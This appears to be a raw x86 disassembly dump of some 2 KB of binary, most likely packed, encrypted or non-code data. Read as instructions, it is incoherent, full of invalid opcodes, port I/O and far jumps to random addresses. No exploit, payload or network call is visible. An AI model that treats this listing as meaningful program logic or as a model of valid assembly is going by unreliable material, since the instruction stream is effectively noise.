  4193ea:	std    
  4193eb:	mov    edi,0x97ea3d5e
  4193f0:	(bad)  
  4193f1:	cld    
  4193f2:	imul   ebx,DWORD PTR [ebx],0x1e
  4193f5:	enter  0x84b,0xb8
  4193f9:	ret    
  4193fa:	paddq  mm0,QWORD PTR [ebx]
  4193fd:	pop    eax
  4193fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4193ff:	sar    esp,1
  419401:	loope  0x41938a
  419403:	mov    ebx,0xc2939884
  419408:	pop    ss
  419409:	mov    dl,0xb9
  41940b:	push   cs
  41940c:	lods   eax,DWORD PTR ds:[esi]
  41940d:	sbb    eax,0xe22ebcd1
  419412:	test   al,0xc3
  419414:	(bad)  
  419415:	and    BYTE PTR [ebx-0x1af2d9cc],dl
  41941b:	mov    al,ds:0xc997b8a0
  419420:	pop    ecx
  419421:	mov    dh,0x98
  419423:	retf   0x1e84
  419426:	sbb    BYTE PTR [edi-0x3cc9b2c9],bh
  41942c:	pop    ds
  41942d:	jl     0x419452
  41942f:	stos   BYTE PTR es:[edi],al
  419430:	dec    esi
  419431:	mov    al,ds:0xb40afc98
  419436:	(bad)  [edi+0xf]
  419439:	idiv   esi
  41943b:	aad    0xfc
  41943d:	or     bh,BYTE PTR [edi+0x7c]
  419440:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419441:	dec    eax
  419442:	shr    ah,cl
  419444:	and    al,0x16
  419446:	jp     0x419413
  419448:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419449:	adc    DWORD PTR [ecx-0x2a],esp
  41944c:	popf   
  41944d:	inc    esi
  41944e:	pop    es
  41944f:	rcr    esi,0x69
  419452:	in     al,dx
  419453:	loop   0x4193ef
  419455:	dec    eax
  419456:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419457:	test   eax,0x82e0abc0
  41945c:	pop    ebx
  41945d:	and    dl,cl
  41945f:	sub    ebp,DWORD PTR [ebx-0x48]
  419462:	push   cs
  419463:	test   eax,0x4578a35b
  419468:	aas    
  419469:	mov    ah,0xf1
  41946b:	mov    BYTE PTR [edi+0x7757c4ac],dh
  419471:	add    edx,0x4b
  419474:	(bad)
  419479:	jecxz  0x4194b5
  41947b:	rcr    BYTE PTR [esi],cl
  41947d:	xchg   al,bh
  41947f:	aas    
  419480:	mov    eax,ds:0xac6f5676
  419485:	and    DWORD PTR [ecx+edx*8+0x9f6daca],esp
  41948c:	mov    ebp,0x26722f03
  419491:	jg     0x419478
  419493:	das    
  419494:	in     eax,0x90
  419496:	fwait
  419497:	adc    ecx,DWORD PTR [esp+edx*4-0x16]
  41949b:	es (bad) 
  41949d:	fiadd  DWORD PTR [edi-0x7816733e]
  4194a3:	(bad)  
  4194a4:	in     eax,0x4c
  4194a6:	pop    ss
  4194a7:	dec    eax
  4194a8:	or     eax,0x273cd2ca
  4194ad:	mov    esi,0xfacab6f8
  4194b2:	(bad)  
  4194b3:	or     eax,0x90d79702
  4194b8:	push   esp
  4194b9:	ret    0xb240
  4194bc:	jae    0x419470
  4194be:	push   es
  4194bf:	not    BYTE PTR [edx]
  4194c1:	call   0xed30ded9
  4194c6:	push   eax
  4194c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4194c8:	fidivr DWORD PTR [edi]
  4194ca:	sbb    eax,0xc60a6429
  4194cf:	sub    ebp,DWORD PTR [ecx]
  4194d1:	jmp    0xadc2:0x68eba229
  4194d8:	retf   
  4194d9:	jg     0x419531
  4194db:	test   BYTE PTR [ebx-0x44],ah
  4194de:	push   edi
  4194df:	or     DWORD PTR [ebx+0x24],ebx
  4194e2:	mov    eax,cs
  4194e4:	lahf   
  4194e5:	enter  0x4364,0x33
  4194e9:	xor    ah,BYTE PTR [edi+eiz*4]
  4194ec:	cli    
  4194ed:	cmc    
  4194ee:	jo     0x419558
  4194f0:	in     eax,dx
  4194f1:	loop   0x4194ff
  4194f3:	pusha  
  4194f4:	mov    dl,0x3f
  4194f6:	clc    
  4194f7:	ret    
  4194f8:	push   0xffffffab
  4194fa:	mov    esp,0xf64947d8
  4194ff:	adc    ebx,edi
  419501:	add    ah,BYTE PTR [ecx+0x704d866a]
  419507:	fs inc edx
  419509:	inc    esp
  41950a:	push   ecx
  41950b:	sahf   
  41950c:	std    
  41950d:	pop    DWORD PTR [edx]
  41950f:	stos   DWORD PTR es:[edi],eax
  419510:	js     0x4194fa
  419512:	mov    edi,cs
  419514:	push   edx
  419515:	cli    
  419516:	mov    ch,0xcb
  419518:	xchg   BYTE PTR [ecx-0xf],bl
  41951b:	adc    DWORD PTR [ebx+0x34701421],ebp
  419521:	loopne 0x4194e7
  419523:	mov    WORD PTR [eax-0x639cbcbc],ds
  419529:	popa   
  41952a:	stos   BYTE PTR es:[edi],al
  41952b:	ret    
  41952c:	shl    ch,1
  41952e:	xchg   ebp,eax
  41952f:	(bad)  
  419530:	cmp    ebp,esi
  419532:	push   esp
  419533:	rol    DWORD PTR [ebx+0x46792bdc],0x9f
  41953a:	ds xchg esp,eax
  41953c:	jae    0x419564
  41953e:	jge    0x419594
  419540:	cmovg  eax,DWORD PTR [esi+0x1af1af0]
  419547:	push   esp
  419548:	xor    BYTE PTR [edi+0x61],dh
  41954b:	mov    edx,0xbcadc360
  419550:	cli    
  419551:	mul    BYTE PTR [ecx]
  419553:	enter  0xb8ac,0xa1
  419557:	pop    ebx
  419558:	cs pop es
  41955a:	and    dl,0x22
  41955d:	fld    DWORD PTR [esi-0x42]
  419560:	imul   BYTE PTR [ecx-0x31]
  419563:	lock dec esp
  419565:	outs   dx,BYTE PTR ds:[esi]
  419566:	pop    ss
  419567:	or     BYTE PTR [ebp-0x58],ch
  41956a:	and    cl,0xd7
  41956d:	mov    edi,0x9cb778b5
  419572:	or     DWORD PTR [ebx],ebx
  419574:	mov    edi,0x5af5af8e
  419579:	jge    0x4195c1
  41957b:	cwde   
  41957c:	xor    BYTE PTR [ebp-0x2d],dh
  41957f:	dec    ebx
  419580:	xchg   ebx,eax
  419581:	jmp    0x4195b6
  419583:	jle    0x4195ae
  419585:	add    eax,0x5ee784fb
  41958a:	sar    edi,cl
  41958c:	aas    
  41958d:	data16 lahf 
  41958f:	mov    ebp,0x772191db
  419594:	adc    al,0x77
  419596:	repz adc al,0x35
  419599:	pop    edi
  41959a:	jle    0x419551
  41959c:	cmp    al,0xd9
  41959e:	sub    cl,ah
  4195a0:	loopne 0x41958a
  4195a2:	mov    edi,0xfc5161c2
  4195a7:	clc    
  4195a8:	retf   
  4195a9:	jmp    0x55d7:0x91cf0f25
  4195b0:	loope  0x419532
  4195b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4195b3:	sbb    al,0x0
  4195b5:	mov    ds:0x66242158,eax
  4195ba:	sub    edi,esi
  4195bc:	ins    BYTE PTR es:[edi],dx
  4195bd:	out    dx,eax
  4195be:	(bad)  
  4195bf:	add    ecx,ecx
  4195c1:	dec    esi
  4195c2:	mov    bh,0xa2
  4195c4:	push   ebx
  4195c5:	data16 fimul WORD PTR [eax-0x3f]
  4195c9:	mov    esp,0x2cebcfc6
  4195ce:	adc    eax,0x788b8e64
  4195d3:	lds    esi,FWORD PTR [edx*2-0x7fd9bcf6]
  4195da:	add    eax,0x574ccf3c
  4195df:	les    eax,FWORD PTR [edi-0x36]
  4195e2:	adc    cl,BYTE PTR [esi]
  4195e4:	ret    0x5e4a
  4195e7:	pushf  
  4195e8:	and    ebp,DWORD PTR [ebx+eax*2+0x65]
  4195ec:	es (bad) 
  4195ee:	xchg   esi,eax
  4195ef:	stos   BYTE PTR es:[edi],al
  4195f0:	test   DWORD PTR ds:0xd345044e,edi
  4195f6:	mov    ch,0x73
  4195f8:	(bad)  
  4195f9:	dec    esp
  4195fa:	js     0x41964d
  4195fc:	cwde   
  4195fd:	sub    al,0xf4
  4195ff:	push   cs
  419600:	shr    BYTE PTR [edi+0x13],cl
  419603:	mov    ebp,0x50e51909
  419608:	adc    eax,esi
  41960a:	das    
  41960b:	xor    esi,DWORD PTR [ecx+0x1e0f74c2]
  419611:	push   ds
  419612:	xchg   esi,eax
  419613:	cli    
  419614:	(bad)  
  419616:	out    0xf1,al
  419618:	dec    ebp
  419619:	pop    ss
  41961a:	pop    eax
  41961b:	mov    dl,0x35
  41961d:	cmp    ch,0x4f
  419620:	mov    bl,0xcc
  419622:	jns    0x4195b7
  419624:	imul   esi,ecx,0xa
  419627:	lds    ebp,FWORD PTR [ebx]
  419629:	mov    edx,0xd95ee6d0
  41962e:	and    DWORD PTR [bp+si+0x43],ebp
  419632:	sbb    al,0x82
  419634:	rol    BYTE PTR [edi+esi*1+0x7c293180],cl
  41963b:	in     eax,0x3b
  41963d:	push   0x70f6188b
  419642:	mul    BYTE PTR [eax]
  419644:	push   edx
  419645:	enter  0xe5ec,0xc7
  419649:	pop    esi
  41964a:	and    edx,DWORD PTR [esi-0x1db28ca2]
  419650:	and    DWORD PTR [ebp+ecx*1+0x1c],edi
  419654:	inc    ebx
  419655:	sub    ebp,ebx
  419657:	push   0xffffff8e
  419659:	mov    bl,0x8a
  41965b:	xor    eax,0xff78318d
  419660:	inc    edx
  419661:	inc    eax
  419662:	fiadd  DWORD PTR [eax]
  419664:	push   edi
  419665:	pop    ecx
  419666:	push   ss
  419667:	mov    al,ds:0xf89f0233
  41966c:	xchg   ebp,eax
  41966d:	lock inc eax
  41966f:	push   esi
  419670:	cld    
  419671:	cli    
  419672:	jmp    0xf271cbcb
  419677:	pop    ds
  419678:	inc    ecx
  419679:	push   0x6ae08a87
  41967e:	cs stc 
  419680:	hlt    
  419681:	popa   
  419682:	in     eax,dx
  419683:	sub    al,0xe9
  419685:	pop    ecx
  419686:	dec    edx
  419687:	(bad)  
  419689:	xor    cl,BYTE PTR [ebp-0x77]
  41968c:	imul   esp,DWORD PTR [eax+0x1f45252f],0x6403221d
  419696:	jb     0x419623
  419698:	fld    QWORD PTR [esi-0x4ee28a58]
  41969e:	jnp    0x4196cc
  4196a0:	arpl   WORD PTR [esi],sp
  4196a2:	shl    BYTE PTR [eax+edi*2-0x19623245],cl
  4196a9:	lods   eax,DWORD PTR ds:[esi]
  4196aa:	test   eax,0x32f02ebc
  4196af:	add    DWORD PTR [ebx],0xffffffac
  4196b2:	inc    ebp
  4196b3:	in     eax,dx
  4196b4:	retf   0xf8d6
  4196b7:	dec    esp
  4196b8:	fdiv   st,st(5)
  4196ba:	mov    cl,0x54
  4196bc:	in     al,dx
  4196bd:	addr16 jno 0x4196c3
  4196c0:	or     ebx,DWORD PTR [ebx+ebp*8+0x7f2a8f2b]
  4196c7:	dec    ebp
  4196c8:	add    dl,BYTE PTR [eax]
  4196ca:	aas    
  4196cb:	sbb    DWORD PTR ds:0xb3b44c99,esp
  4196d1:	out    0xdf,eax
  4196d3:	mov    esi,0xa19aca31
  4196d8:	and    dl,BYTE PTR [ecx]
  4196da:	sbb    esi,DWORD PTR [edx]
  4196dc:	mov    ds:0x97cae9a5,al
  4196e1:	cmp    dh,BYTE PTR [ecx+0x26]
  4196e4:	outs   dx,DWORD PTR ds:[esi]
  4196e5:	aam    0x79
  4196e7:	xchg   edx,eax
  4196e8:	fadd   DWORD PTR [esi-0x45d1b3a8]
  4196ee:	fidiv  WORD PTR [eax]
  4196f0:	jp     0x419675
  4196f2:	or     BYTE PTR [edi+0xaaf8c4f],al
  4196f8:	push   edi
  4196f9:	cmp    al,0xe
  4196fb:	int3   
  4196fc:	popa   
  4196fd:	xchg   dh,dh
  4196ff:	test   al,0x4f
  419701:	scas   eax,DWORD PTR es:[edi]
  419702:	add    ecx,DWORD PTR [edi-0x4]
  419705:	pusha  
  419706:	jnp    0x4196c5
  419708:	push   edi
  419709:	xlat   BYTE PTR ds:[ebx]
  41970a:	jbe    0x419742
  41970c:	aam    0xcf
  41970e:	jne    0x41975b
  419710:	inc    eax
  419711:	iret   
  419712:	mov    eax,ds:0x6db92486
  419717:	icebp  
  419718:	jbe    0x4196a1
  41971a:	mov    edx,0xdd843da4
  41971f:	jne    0x419793
  419721:	cmc    
  419722:	sbb    edi,DWORD PTR [edi]
  419724:	test   eax,0xe7518806
  419729:	in     eax,0xbe
  41972b:	jg     0x419711
  41972d:	pop    edx
  41972e:	pop    edi
  41972f:	in     al,0xbd
  419731:	mov    ds:0x1665520d,eax
  419736:	stc    
  419737:	cmp    BYTE PTR [ebx-0x282be470],cl
  41973d:	scas   al,BYTE PTR es:[edi]
  41973e:	or     ebp,ebx
  419740:	repz (bad) 
  419742:	and    dl,BYTE PTR [esi-0x14]
  419745:	xor    BYTE PTR [esi+0x40977e46],0xe3
  41974c:	cmp    al,0xa2
  41974e:	(bad)  
  41974f:	stos   DWORD PTR es:[edi],eax
  419750:	mov    bl,0xfc
  419752:	mov    ebp,0x626267e0
  419757:	jbe    0x41977c
  419759:	das    
  41975a:	jecxz  0x419722
  41975c:	out    0xd1,eax
  41975e:	mov    esp,0x165fe988
  419763:	xor    edx,DWORD PTR [edi]
  419765:	cld    
  419766:	cmp    al,0x51
  419768:	or     bl,ah
  41976a:	push   esi
  41976b:	aaa    
  41976c:	or     DWORD PTR [ecx+0x5e],esi
  41976f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419770:	shl    DWORD PTR ds:0x3232d9c1,0xc8
  419777:	jae    0x4197c2
  419779:	and    eax,0x53dcca4
  41977e:	je     0x207c25b5
  419784:	xchg   edi,eax
  419785:	sbb    dl,dl
  419787:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419788:	inc    esp
  419789:	sbb    BYTE PTR [ebx+0x1e],ah
  41978c:	cmp    cl,BYTE PTR [ecx+0x18]
  41978f:	mov    ch,0x84
  419791:	sub    eax,0x98ce4220
  419796:	mov    ebx,0x1d375ca
  41979b:	sti    
  41979c:	scas   eax,DWORD PTR es:[edi]
  41979d:	repnz into 
  41979f:	sbb    bh,BYTE PTR [eax-0x51b4d623]
  4197a5:	mov    dh,0xba
  4197a7:	push   0x5f5139c4
  4197ac:	pop    esp
  4197ad:	xor    DWORD PTR [ecx],0xdb73cd44
  4197b3:	(bad)  
  4197b5:	cmc    
  4197b6:	pop    esp
  4197b7:	std    
  4197b8:	add    bh,cl
  4197ba:	sub    BYTE PTR [eax],0xe4
  4197bd:	jne    0x4197f5
  4197bf:	add    dh,BYTE PTR [esi+esi*2+0x6eb30c53]
  4197c6:	fiadd  WORD PTR [eax+0x5b]
  4197c9:	jmp    0xd2383be5
  4197ce:	test   DWORD PTR [eax],esi
  4197d0:	xlat   BYTE PTR ds:[ebx]
  4197d1:	push   ecx
  4197d2:	adc    esp,DWORD PTR [eax]
  4197d4:	jo     0x419796
  4197d6:	xchg   esi,eax
  4197d8:	stos   BYTE PTR es:[edi],al
  4197d9:	push   eax
  4197da:	mov    ecx,0xbea31414
  4197df:	ds loopne 0x419829
  4197e2:	inc    eax
  4197e3:	mov    esi,0xb32beb78
  4197e8:	js     0x419826
  4197ea:	out    0xeb,eax
  4197ec:	sub    eax,0x75d632a5
  4197f1:	inc    edx
  4197f2:	ins    DWORD PTR es:[edi],dx
  4197f3:	in     al,dx
  4197f4:	scas   al,BYTE PTR es:[edi]
  4197f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4197f6:	loopne 0x419852
  4197f8:	jae    0x41978e
  4197fa:	jg     0x4197ce
  4197fc:	and    ebp,edx
  4197fe:	dec    ebx
  4197ff:	mov    dl,0x8e
  419801:	sbb    al,0xe4
  419803:	sbb    BYTE PTR [esi],cl
  419805:	icebp  
  419806:	daa    
  419807:	das    
  419808:	jge    0x41984d
  41980a:	icebp  
  41980b:	pop    esp
  41980c:	inc    edx
  41980d:	add    al,0x97
  41980f:	pop    ebx
  419810:	ror    cl,cl
  419812:	jg     0x419860
  419814:	jge    0x419841
  419816:	xchg   ebx,eax
  419817:	pop    ebx
  419818:	xchg   ecx,eax
  419819:	(bad)  
  41981a:	and    bh,BYTE PTR [eax-0x41c468cc]
  419820:	pop    esp
  419821:	sub    ebp,DWORD PTR [edi+esi*2+0x32]
  419825:	xor    BYTE PTR [ebx+0x42203fef],bl
  41982b:	jl     0x4197ff
  41982d:	adc    ebx,DWORD PTR ds:0x29121905
  419833:	sbb    DWORD PTR ds:0x15970daf,ecx
  419839:	cmp    al,0x79
  41983b:	inc    eax
  41983c:	mov    ah,0xe
  41983e:	dec    eax
  41983f:	sar    DWORD PTR [ecx-0x4db87871],cl
  419845:	fcomp  DWORD PTR [edx]
  419847:	add    al,0x77
  419849:	inc    ecx
  41984a:	lods   al,BYTE PTR ds:[esi]
  41984b:	mov    ds:0xb84e8c47,eax
  419850:	gs aas 
  419852:	xor    esp,DWORD PTR ds:0x2580eda4
  419858:	test   eax,eax
  41985a:	repz addr16 mov bl,0xed
  41985e:	icebp  
  41985f:	call   0xf5b5d69b
  419864:	in     al,0x2b
  419866:	xor    DWORD PTR [esi],ebx
  419868:	mov    WORD PTR [ebx+edx*8+0x46],gs
  41986c:	imul   BYTE PTR [edi-0x25]
  41986f:	in     eax,dx
  419870:	repnz push eax
  419872:	push   ss
  419873:	enter  0xb3b9,0x3c
  419877:	das    
  419878:	or     eax,0xccdfe3c
  41987d:	je     0x419855
  41987f:	xchg   BYTE PTR [ecx+0x1],al
  419882:	in     eax,0x85
  419884:	sbb    BYTE PTR [ecx+0x391488eb],al
  41988a:	(bad)  
  41988b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41988c:	repz and al,0xbb
  41988f:	stos   DWORD PTR es:[edi],eax
  419890:	out    dx,al
  419891:	sub    BYTE PTR [ecx],0xe7
  419894:	pop    edi
  419895:	or     al,0x2e
  419897:	test   al,0x2b
  419899:	in     al,dx
  41989a:	fwait
  41989b:	push   ebx
  41989c:	ds repnz xchg edx,eax
  41989f:	dec    ebp
  4198a0:	push   edi
  4198a1:	pop    ecx
  4198a2:	fs mov edx,0x634d0c30
  4198a8:	jge    0x41985b
  4198aa:	mul    BYTE PTR ds:0x1cdb0926
  4198b0:	scas   eax,DWORD PTR es:[edi]
  4198b1:	out    0x9d,eax
  4198b3:	ret    0x99bc
  4198b6:	xor    edx,DWORD PTR [edx+0x51b72a8]
  4198bc:	les    eax,FWORD PTR [esi-0x20]
  4198bf:	sub    cl,BYTE PTR [esi-0x6c3e8517]
  4198c5:	or     BYTE PTR [edi],dh
  4198c7:	rcr    BYTE PTR [edx],cl
  4198c9:	mov    BYTE PTR ds:0x239f2c1f,al
  4198cf:	mov    ebp,0x799a9a47
  4198d4:	jae    0x419887
  4198d6:	sbb    eax,0xfe69501e
  4198db:	fstp   DWORD PTR [ecx+0x6a]
  4198de:	ins    BYTE PTR es:[edi],dx
  4198df:	(bad)  
  4198e0:	jp     0x4198a7
  4198e2:	loop   0x4198a2
  4198e4:	cmc    
  4198e5:	(bad)  
  4198e6:	leave  
  4198e7:	and    bl,BYTE PTR [ecx+ebx*8-0x172ce334]
  4198ee:	loope  0x419941
  4198f0:	mov    ds:0xf56befb0,al
  4198f5:	daa    
  4198f6:	xchg   ebp,eax
  4198f7:	inc    edx
  4198f8:	xor    BYTE PTR [edx],0xe4
  4198fb:	or     al,0xe7
  4198fd:	pop    ebx
  4198fe:	cmp    eax,0xc7dd1308
  419903:	(bad)  
  419904:	mov    ch,0x44
  419906:	loopne 0x419922
  419908:	test   al,0xb1
  41990a:	repnz add BYTE PTR [esi+ebx*1],dh
  41990e:	jmp    0xdfc3:0xc24bd854
  419915:	fincstp 
  419917:	jae    0x41989d
  419919:	inc    edi
  41991a:	sbb    BYTE PTR [ecx-0x372437ec],0x66
  419921:	xchg   ebx,eax
  419922:	out    dx,al
  419923:	mov    ds:0xade89a3b,eax
  419928:	add    BYTE PTR [edi-0x6db321f7],dh
  41992e:	pop    ecx
  41992f:	mov    esi,es
  419931:	daa    
  419932:	fidiv  WORD PTR [edi-0x71]
  419935:	jmp    0x2842:0xcdef7adc
  41993c:	jp     0x419996
  41993e:	xor    esi,esp
  419940:	cmp    ebx,DWORD PTR [eax-0x164f4f01]
  419946:	sbb    edi,edx
  419948:	ss clc 
  41994a:	(bad)  
  41994b:	push   ss
  41994c:	xchg   edx,edx
  41994e:	or     dl,bl
  419950:	enter  0xebea,0x70
  419954:	xchg   DWORD PTR [ebx-0x77dacadc],esi
  41995a:	dec    ebp
  41995b:	enter  0xfedf,0xf
  41995f:	das    
  419960:	iret   
  419961:	mov    ebx,eax
  419963:	fistp  QWORD PTR [eax+0x70dc2940]
  419969:	mov    ch,ch
  41996b:	mov    al,BYTE PTR [edx+0x49]
  41996e:	imul   ebp,DWORD PTR [eax+eiz*2],0xffffffa9
  419972:	fimul  WORD PTR [eax]
  419974:	outs   dx,BYTE PTR ds:[esi]
  419975:	in     al,dx
  419976:	data16 clc 
  419978:	or     DWORD PTR [ebp+0x1e],edi
  41997b:	lahf   
  41997c:	test   BYTE PTR [esi+0x2d],dh
  41997f:	sti    
  419980:	cmp    DWORD PTR [ebx+0x36],ebp
  419983:	adc    al,cl
  419985:	arpl   WORD PTR [esi],bx
  419987:	mov    ah,0x40
  419989:	icebp  
  41998a:	sub    eax,0x548e3d94
  41998f:	ds ret 
  419991:	repz inc ebp
  419993:	(bad)  
  419995:	mov    dl,0xec
  419997:	test   DWORD PTR [ecx+0x1ce0a478],eax
  41999d:	lahf   
  41999e:	sbb    edi,DWORD PTR [eax+0x52]
  4199a1:	mov    eax,ds:0xc6e3049d
  4199a6:	punpckldq mm1,DWORD PTR [esi]
  4199a9:	nop
  4199aa:	ins    BYTE PTR es:[edi],dx
  4199ab:	push   ecx
  4199ac:	loope  0x419a05
  4199ae:	loope  0x419a16
  4199b0:	xor    esp,ebp
  4199b2:	fcomp  DWORD PTR [eax-0x2f]
  4199b5:	les    ecx,FWORD PTR [esi]
  4199b7:	cmc    
  4199b8:	push   edx
  4199b9:	xor    al,0x48
  4199bb:	and    al,0xb2
  4199be:	mov    WORD PTR [ebp+0x4b],cs
  4199c1:	push   es
  4199c2:	inc    edx
  4199c3:	sub    BYTE PTR [eax-0x70],dl
  4199c6:	dec    ebp
  4199c7:	ret    
  4199c8:	jne    0x4199de
  4199ca:	cmp    eax,0xc899d8b4
  4199cf:	xchg   esi,eax
  4199d0:	cmp    dl,bl
  4199d2:	lods   eax,DWORD PTR ds:[esi]
  4199d3:	inc    eax
  4199d4:	out    dx,al
  4199d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4199d6:	out    0xda,al
  4199d8:	scas   eax,DWORD PTR es:[edi]
  4199d9:	pop    esi
  4199da:	imul   ebx,DWORD PTR ds:0x135f65fd,0xffffffda
  4199e1:	mov    edx,0xe6ec5bd9
  4199e6:	mov    ah,0x15
  4199e8:	sbb    DWORD PTR [edi-0x9],ecx
  4199eb:	cmp    eax,0x6aa1dad1
  4199f0:	nop
  4199f1:	ins    DWORD PTR es:[edi],dx
  4199f2:	cmp    BYTE PTR [eax+0x6e],cl
  4199f5:	fcom   QWORD PTR [eax+0x14e0ac44]
  4199fb:	mov    eax,ds:0xf7dcefca
  419a00:	out    dx,al
  419a01:	in     al,dx
  419a02:	std    
  419a03:	daa    
  419a04:	call   0x7ca8e7be
  419a09:	jle    0x419993
  419a0b:	mov    edx,0x75ee2c29
  419a10:	shr    BYTE PTR [esi],cl
  419a12:	push   eax
  419a13:	fstsw  WORD PTR [edx]
  419a16:	mov    al,ds:0xbe076151
  419a1b:	test   DWORD PTR [ecx-0x53],edx
  419a1e:	les    ecx,FWORD PTR [esi]
  419a20:	pop    ecx
  419a21:	pop    ecx
  419a22:	in     eax,dx
  419a23:	fstp   DWORD PTR [ecx+0x7165dac1]
  419a29:	test   eax,0xcf80bcf1
  419a2e:	and    ebx,DWORD PTR [edi]
  419a30:	jle    0x4199dd
  419a32:	adc    esp,ebp
  419a34:	xchg   BYTE PTR [ebx+ebx*1+0x2d],bl
  419a38:	test   BYTE PTR [edx-0x135b22f9],0xd0
  419a3f:	retf   0x6f6d
  419a42:	hlt    
  419a43:	and    BYTE PTR [ebp-0x6a],ah
  419a46:	std    
  419a47:	mov    dh,0x58
  419a49:	xchg   edx,ebx
  419a4b:	ffreep st(0)
  419a4d:	mov    dh,0x93
  419a4f:	dec    esi
  419a50:	dec    eax
  419a51:	pop    ss
  419a52:	mov    dl,0x96
  419a54:	cs inc esp
  419a56:	sar    BYTE PTR [esi-0x3d],cl
  419a59:	in     al,dx
  419a5a:	jns    0x419a2f
  419a5c:	adc    ebx,ebx
  419a5e:	cdq    
  419a5f:	(bad)  
  419a60:	cmp    BYTE PTR [edi+edi*8+0x1d7d446d],cl
  419a67:	inc    ebx
  419a68:	pushf  
  419a69:	push   cs
  419a6a:	pop    esp
  419a6b:	push   0xffffffa1
  419a6d:	scas   eax,DWORD PTR es:[edi]
  419a6e:	sbb    eax,0x4df1c5bc
  419a73:	stos   BYTE PTR es:[edi],al
  419a74:	adc    BYTE PTR [ebx-0x2e7711f2],dh
  419a7a:	(bad)  
  419a7c:	jbe    0x419a24
  419a7e:	dec    edi
  419a7f:	inc    ecx
  419a80:	xchg   edx,eax
  419a81:	cli    
  419a82:	(bad)  
  419a83:	cmp    al,0xaa
  419a85:	std    
  419a86:	push   ss
  419a87:	jmp    0xd4ec1044
  419a8c:	aad    0x55
  419a8e:	push   0xffffff93
  419a90:	sub    esi,edi
  419a92:	mov    cl,0xd9
  419a94:	jb     0x419a4f
  419a96:	cwde   
  419a97:	and    DWORD PTR [ecx+0x2b],0xffffffaa
  419a9b:	adc    eax,0x431a1389
  419aa0:	test   DWORD PTR [ebx+edx*4],0x91ce87bd
  419aa7:	adc    eax,0x9c1a3e4e
  419aac:	sbb    eax,0xc843afd1
  419ab1:	push   edi
  419ab2:	push   edx
  419ab3:	xchg   DWORD PTR [ebx],esp
  419ab5:	test   eax,0x9e6cbbdf
  419aba:	mov    eax,ds:0x28bad14e
  419abf:	lock sub edx,DWORD PTR ds:0x385799a1
  419ac6:	push   ss
  419ac7:	pop    edi
  419ac8:	mov    eax,0x9e3ae5e4
  419acd:	sbb    edx,edx
  419acf:	jbe    0x419a95
  419ad1:	stos   DWORD PTR es:[edi],eax
  419ad2:	xor    esp,0xfc04d17b
  419ad8:	or     eax,0x73cacf57
  419add:	aad    0xd0
  419adf:	lds    esp,FWORD PTR [edx-0x1fb79738]
  419ae5:	shl    DWORD PTR [edx-0x5e],cl
  419ae8:	lea    esp,[ebp+0x51]
  419aeb:	data16 sbb al,0xe3
  419aee:	pop    ebp
  419aef:	mov    ?,esp
  419af1:	jmp    0x1164315a
  419af6:	push   ds
  419af7:	cmp    BYTE PTR [edi],ch
  419af9:	out    0xc6,eax
  419afb:	repnz xor eax,0xcdef42b5
  419b01:	cdq    
  419b02:	gs mov al,0xc
  419b05:	cwde   
  419b06:	pop    ebp
  419b07:	ins    BYTE PTR es:[edi],dx
  419b08:	out    dx,eax
  419b09:	jmp    0x8b3b:0x33be8956
  419b10:	or     eax,0x4daaeeb8
  419b15:	int    0x5d
  419b17:	fisttp QWORD PTR [eax+0x166d7e98]
  419b1d:	xchg   esp,eax
  419b1e:	xor    al,ah
  419b20:	adc    DWORD PTR ds:0xb5e7b0c2,0xffffffda
  419b27:	inc    ecx
  419b28:	sbb    dh,BYTE PTR [esi+0x4e]
  419b2b:	jae    0x419b41
  419b2d:	repnz xchg ebx,eax
  419b2f:	or     BYTE PTR [ecx],al
  419b31:	sbb    eax,0xe6784840
  419b36:	(bad)  
  419b37:	loopne 0x419b70
  419b39:	out    0x8e,al
  419b3b:	mov    es,WORD PTR [eax+0x78]
  419b3e:	int    0x15
  419b40:	(bad)  
  419b41:	xchg   esi,eax
  419b42:	les    eax,FWORD PTR [ecx+0x3e]
  419b45:	jnp    0x419b50
  419b47:	pmaddwd mm0,QWORD PTR [ecx-0x7c]
  419b4b:	mov    dl,0x86
  419b4d:	test   eax,0x6f39c515
  419b52:	inc    edx
  419b53:	repz shl BYTE PTR [eax-0x6c28dff8],cl
  419b5a:	(bad)  
  419b5b:	adc    ebx,DWORD PTR [edi+0xe]
  419b5e:	mov    cl,0xca
  419b60:	fmul   DWORD PTR [edi]
  419b62:	bound  ecx,QWORD PTR ds:0x9a8bcaf9
  419b68:	jecxz  0x419b20
  419b6a:	ficom  WORD PTR ds:0xfcc8e107
  419b70:	and    cl,bh
  419b72:	popa   
  419b73:	push   esi
  419b74:	loope  0x419b69
  419b76:	loope  0x419b37
  419b78:	scas   eax,DWORD PTR es:[edi]
  419b79:	mov    ch,bh
  419b7b:	pushf  
  419b7c:	pop    ss
  419b7d:	and    BYTE PTR [edx-0x33cad6a0],bh
  419b83:	outs   dx,BYTE PTR ds:[esi]
  419b84:	stos   BYTE PTR es:[edi],al
  419b85:	cmp    dl,0x70
  419b88:	jge    0x419baf
  419b8a:	add    ecx,DWORD PTR [edx]
  419b8c:	mov    al,0xf3
  419b8e:	or     BYTE PTR [ebp-0x31],cl
  419b91:	mov    bl,0xb3
  419b93:	jg     0x419b78
  419b95:	pop    ecx
  419b96:	dec    esp
  419b97:	fisub  DWORD PTR [ebp+0x35]
  419b9a:	inc    ebp
  419b9b:	mov    cl,0x5d
  419b9d:	mov    edx,0x6b36a663
  419ba2:	push   eax
  419ba3:	in     eax,0x34
  419ba5:	inc    ecx
  419ba6:	and    al,0xd8
  419ba8:	test   BYTE PTR [edx+ecx*1+0x2e],0x6
  419bad:	inc    esi
  419bae:	in     al,dx
  419baf:	dec    esi
  419bb0:	mov    DWORD PTR [edx-0x3e],esi
  419bb3:	xor    eax,0x157765f0
  419bb8:	xchg   BYTE PTR [edx+0x6c],ah
  419bbb:	int    0xd9
  419bbd:	mov    cl,0x5
  419bbf:	js     0x419c1a
